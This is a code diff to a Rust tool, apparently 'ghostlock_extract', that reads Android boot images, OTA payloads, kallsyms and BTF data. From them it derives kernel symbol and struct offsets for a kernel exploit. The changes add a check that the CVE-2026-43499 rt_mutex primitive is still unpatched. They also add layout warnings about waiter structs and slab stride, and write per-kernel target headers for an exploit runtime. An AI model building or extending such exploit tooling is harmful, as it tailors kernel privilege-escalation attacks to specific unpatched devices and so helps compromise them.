@@ -8,7 +8,8 @@ use clap::Parser;
 use ghostlock_extract::boot::{BootImage, MTK_DEFAULT_PHYS_LOAD, MTK_VADDR_BASE};
 use ghostlock_extract::btf::Btf;
 use ghostlock_extract::derive::{
-    derive_nf_logger_registration, derive_pselect_layout, relative_symbols, PSELECT_ROUTE_NFDS,
+    PSELECT_ROUTE_NFDS, derive_nf_logger_registration, derive_pselect_layout,
+    ensure_rtmutex_43499_unpatched, relative_symbols,
 };
 use ghostlock_extract::error::{ExtractError, Result};
 use ghostlock_extract::fdt::recover_kernel_phys_load;
@@ -17,7 +18,7 @@ use ghostlock_extract::kallsyms::Kallsyms;
 use ghostlock_extract::kallsyms_finder;
 use ghostlock_extract::payload;
 use ghostlock_extract::report;
-use ghostlock_extract::symbols::{resolve_structs, resolve_symbols};
+use ghostlock_extract::symbols::{kernel_struct_macro, resolve_structs, resolve_symbols};
 
 #[derive(Parser, Debug)]
 #[command(
@@ -35,6 +36,9 @@ struct Cli {
     /// optional XBL xbl_config.img; derive kernel physical load from its FDT
     #[arg(long)]
     xbl_config: Option<PathBuf>,
+    /// require xbl_config.img in addition to boot.img (Qualcomm offset flow)
+    #[arg(long)]
+    require_xbl: bool,
     /// kernel physical load address (hex or decimal); overrides defaults
     #[arg(long, value_parser = parse_int)]
     phys: Option<u64>,
@@ -132,13 +136,10 @@ fn obtain_kallsyms(provided: Option<&Path>) -> Result<Option<PathBuf>> {
         return Ok(Some(provided.to_path_buf()));
     }
     // On a rooted phone /proc/kallsyms is the natural source.
+    // procfs stat reports len 0 for it, so probe readability with File::open.
     let proc_ksyms = Path::new("/proc/kallsyms");
-    if proc_ksyms.is_file() {
-        if let Ok(meta) = std::fs::metadata(proc_ksyms) {
-            if meta.len() > 0 {
-                return Ok(Some(proc_ksyms.to_path_buf()));
-            }
-        }
+    if proc_ksyms.is_file() && std::fs::File::open(proc_ksyms).is_ok() {
+        return Ok(Some(proc_ksyms.to_path_buf()));
     }
     Ok(None)
 }
@@ -158,7 +159,20 @@ fn resolve_kallsyms(
     cli: &Cli,
 ) -> Result<Kallsyms> {
     if let Some(path) = obtain_kallsyms(cli.kallsyms.as_deref())? {
-        return parse_kallsyms_file(&path);
+        if cli.kallsyms.is_some() {
+            // an explicit --kallsyms fails loudly instead of falling back
+            return parse_kallsyms_file(&path);
+        }
+        // kptr_restrict zeroes every address; treat that as a missing table
+        if let Ok(ks) = parse_kallsyms_file(&path) {
+            if ks
+                .symbols
+                .values()
+                .any(|addrs| addrs.iter().any(|&a| a != 0))
+            {
+                return Ok(ks);
+            }
+        }
     }
     kallsyms_finder::recover(&boot.kernel, btf_at)
         .map_err(|err| ExtractError::kallsyms(err.to_string()))
@@ -178,10 +192,7 @@ fn run(cli: &Cli) -> Result<i32> {
             .map_err(|err| ExtractError::new(format!("{err:#}")))?;
         let want = payload::analysis_partition_names(&meta_view)
             .map_err(|err| ExtractError::new(format!("{err:#}")))?;
-        eprintln!(
-            "info: analyzing partitions: {}",
-            want.join(", ")
-        );
+        eprintln!("info: analyzing partitions: {}", want.join(", "));
         let payload_view = payload::open_payload_for(&input, &work_dir, &want, download_progress())
             .map_err(|err| ExtractError::new(format!("{err:#}")))?;
         let (extracted_boot, extracted_xbl) =
@@ -199,13 +210,52 @@ fn run(cli: &Cli) -> Result<i32> {
         );
     }
 
+    if cli.require_xbl && xbl_path.is_none() {
+        return Err(ExtractError::new(
+            "Qualcomm offset analysis requires xbl_config.img, but the supplied OTA has no xbl_config partition",
+        ));
+    }
+
     let boot = BootImage::load(&boot_path)?;
     let mut kernel_phys_load = if let Some(xbl) = &xbl_path {
-        Some(recover_kernel_phys_load(xbl)?)
+        match recover_kernel_phys_load(xbl) {
+            Ok(phys) => Some(phys),
+            Err(err) => {
+                eprintln!(
+                    "warning: xbl_config FDT parse failed: {err}; proceeding with boot-only analysis"
+                );
+                cli.phys
+            }
+        }
     } else {
         cli.phys
     };
+
     let btf_at = boot.embedded_btf_at();
+    let ks = resolve_kallsyms(
+        &boot,
+        btf_at.as_ref().map(|(offset, blob)| (*offset, blob.len())),
+        cli,
+    )?;
+    let symbols = ks.symbols;
+    let text_base = kallsyms::unique(&symbols, "_text");
+    let base = text_base.or_else(|| kallsyms::unique(&symbols, "_head"));
+    let Some(base) = base else {
+        return Err(ExtractError::new("_text/_head is not unique in kallsyms"));
+    };
+    let (rel_symbols, sorted_offsets) = relative_symbols(&symbols, base);
+    // stop early when remove_waiter() is fixed.
+    match ensure_rtmutex_43499_unpatched(&boot.kernel, &rel_symbols, &sorted_offsets) {
+        Ok(remove_waiter) => eprintln!(
+            "info: (CVE-2026-43499 primitive present \
+             (remove_waiter@{remove_waiter:#x} still uses current)"
+        ),
+        Err(err) => {
+            eprintln!("error: {err}");
+            return Ok(6);
+        }
+    }
+
     let btf_raw = btf_at.as_ref().map(|(_, blob)| blob.clone());
     let btf = btf_raw.as_deref().map(Btf::new).transpose()?;
     if btf.is_none() {
@@ -215,43 +265,44 @@ fn run(cli: &Cli) -> Result<i32> {
         );
     }
 
-    let ks = resolve_kallsyms(
-        &boot,
-        btf_at.as_ref().map(|(offset, blob)| (*offset, blob.len())),
-        cli,
-    )?;
-    let symbols = ks.symbols;
-
-    let text_base = kallsyms::unique(&symbols, "_text");
-    let base = text_base.or_else(|| kallsyms::unique(&symbols, "_head"));
-    let Some(base) = base else {
-        return Err(ExtractError::new("_text/_head is not unique in kallsyms"));
-    };
-
     let release = boot.release();
+    match release.as_deref() {
+        Some(release) => {
+            if kernel_struct_macro(Some(release)).is_none() {
+                eprintln!(
+                    "warning: {release} is not a verified kernel family \
+                     (6.1, 6.6, 6.12); emitting the 6.6 layout as a testing \
+                     starting point, verify the waiter layout and slab \
+                     stride before trusting it"
+                );
+            }
+        }
+        None => {
+            eprintln!("warning: boot image carries no kernel release string");
+        }
+    }
     if kernel_phys_load.is_none() && (boot.mtk_lz4 || boot.mtk_gzip) {
         if let Some(text_base) = text_base {
-            let derived = text_base - MTK_VADDR_BASE;
-            if derived > 0 && derived <= 0xFFFF_FFFF {
-                eprintln!(
-                    "info: MediaTek compressed image; kernel_phys_load derived \
-                     from _text: 0x{derived:x} (DRAM base; pass --phys to override)"
-                );
-                kernel_phys_load = Some(derived);
-            } else {
-                eprintln!(
-                    "warning: derived MediaTek kernel_phys_load=0x{derived:x} is \
-                     implausible; using 0x{MTK_DEFAULT_PHYS_LOAD:x} (pass --phys \
-                     to override)"
-                );
-                kernel_phys_load = Some(MTK_DEFAULT_PHYS_LOAD);
+            match text_base.checked_sub(MTK_VADDR_BASE) {
+                Some(derived) if derived == MTK_DEFAULT_PHYS_LOAD => {
+                    eprintln!(
+                        "info: MediaTek compressed image; _text confirms \
+                         kernel_phys_load=0x{derived:x} (DRAM base)"
+                    );
+                    kernel_phys_load = Some(derived);
+                }
+                _ => {
+                    eprintln!(
+                        "warning: _text=0x{text_base:x} does not match the mtk \
+                         DRAM-base mapping; kernel_phys_load left unset so the \
+                         runtime derives it (pass --phys to override)"
+                    );
+                }
             }
         } else {
-            kernel_phys_load = Some(MTK_DEFAULT_PHYS_LOAD);
             eprintln!(
-                "info: MediaTek compressed image; _text unavailable, assuming \
-                 kernel_phys_load=0x{MTK_DEFAULT_PHYS_LOAD:x} (DRAM base; pass \
-                 --phys to override)"
+                "info: MediaTek compressed image; _text unavailable, leaving \
+                 kernel_phys_load unset so the runtime derives it"
             );
         }
     }
@@ -266,7 +317,6 @@ fn run(cli: &Cli) -> Result<i32> {
     let mut derived: BTreeMap<String, u64> = BTreeMap::new();
     if !cli.no_disasm {
         if let Some(btf) = &btf {
-            let (rel_symbols, sorted_offsets) = relative_symbols(&symbols, base);
             match derive_pselect_layout(
                 &boot.kernel,
                 &rel_symbols,
@@ -387,32 +437,20 @@ fn run(cli: &Cli) -> Result<i32> {
             );
         }
     }
-    // On pre-6.4 kernels the BTF may lack rt_mutex_waiter/slab members that
-    // 6.x kernels expose (different struct layouts).  Gate the struct-field
-    // requirement on allow_missing so these degrade to 0 (runtime falls back
-    // to target.h/STRUCT_OFFSETS defaults) instead of aborting outright.
-    let struct_optional: BTreeSet<&str> =
-        if cli.allow_missing { report::struct_keys_all().into_iter().collect() } else { BTreeSet::new() };
     report::require_fields(&symbol_offsets, &BTreeSet::new())?;
     if btf.is_some() {
         let struct_fields_u64: BTreeMap<String, Option<u64>> = struct_offsets
             .iter()
             .map(|(key, value)| (key.clone(), value.map(|v| v as u64)))
             .collect();
-        report::require_fields(&struct_fields_u64, &struct_optional)?;
+        report::require_fields(&struct_fields_u64, &BTreeSet::new())?;
     }
-    if let Some(mm_size) = struct_offsets
-        .get("struct_mm_struct")
-        .copied()
-        .flatten()
-    {
+    if let Some(mm_size) = struct_offsets.get("struct_mm_struct").copied().flatten() {
         eprintln!(
             "info: sizeof(mm_struct)=0x{mm_size:X} (MM_STRUCT_SZ=0x500 in src/core/common.h)"
         );
         if mm_size > 0x500 {
-            eprintln!(
-                "warning: sizeof(mm_struct) exceeds the hardcoded MM_STRUCT_SZ slab stride"
-            );
+            eprintln!("warning: sizeof(mm_struct) exceeds the hardcoded MM_STRUCT_SZ slab stride");
         }
     }
 
@@ -440,7 +478,9 @@ fn run(cli: &Cli) -> Result<i32> {
         );
         let target = report::kernel_header_path(&key);
         if target.exists()
-            && std::fs::read_to_string(&target).map(|t| t != output).unwrap_or(true)
+            && std::fs::read_to_string(&target)
+                .map(|t| t != output)
+                .unwrap_or(true)
             && !cli.force
         {
             return Err(ExtractError::new(format!(
@@ -486,9 +526,11 @@ fn run(cli: &Cli) -> Result<i32> {
     let remaining: Vec<String> = symbol_offsets
         .iter()
         .map(|(key, value)| (key.clone(), value.map(|v| v as u64)))
-        .chain(struct_offsets.iter().map(|(key, value)| {
-            (key.clone(), value.map(|v| v as u64))
-        }))
+        .chain(
+            struct_offsets
+                .iter()
+                .map(|(key, value)| (key.clone(), value.map(|v| v as u64))),
+        )
         .filter(|(_, value)| value.is_none())
         .map(|(key, _)| key.clone())
         .collect();
@@ -505,11 +547,15 @@ fn main() {
         Err(err) => {
             eprintln!("error: {err}");
             // Exit codes let the app distinguish failure classes:
-            // 2 generic parse failure, 3 pselect route infeasible,
-            // 4 missing required offsets, 5 kallsyms recovery failure.
+            // 2 generic parse failure,
+            // 3 pselect route infeasible,
+            // 4 missing required offsets,
+            // 5 kallsyms recovery failure,
+            // 6 primitive already fixed.
             let code = match &err {
                 ExtractError::Infeasible(_) => 3,
                 ExtractError::Unsupported(_) => 4,
+                ExtractError::AlreadyFixed(_) => 6,
                 ExtractError::Kallsyms(_) => 5,
                 ExtractError::Message(_) => 2,
             };
